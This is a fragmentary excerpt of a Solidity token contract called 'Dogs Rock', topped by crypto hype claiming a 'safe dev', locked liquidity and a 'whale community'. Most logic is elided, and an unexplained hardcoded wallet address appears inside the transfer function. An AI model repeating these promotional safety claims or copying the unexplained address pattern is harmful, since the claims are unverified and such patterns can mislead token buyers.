...
~Safe dev with insane previous launched anon
~locked & renounced
~Community token with utility & bullish plans 
Join our whale community & become a whale yourself
...
contract DogsRock is Context, IERC20, Ownable {
    ...
    string private constant _name = "Dogs Rock"; // 
    string private constant _symbol = "ElonDogs"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 3;
    uint256 public _liquidityFee = 1;
    address public  _marketingWallet = 0x1d8BC7Aa13EaE876615Fa57d1541bDFDd9E6C863;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0x63a04cCf2E8a4A7da5070eF19b3DC56552f54e4F;
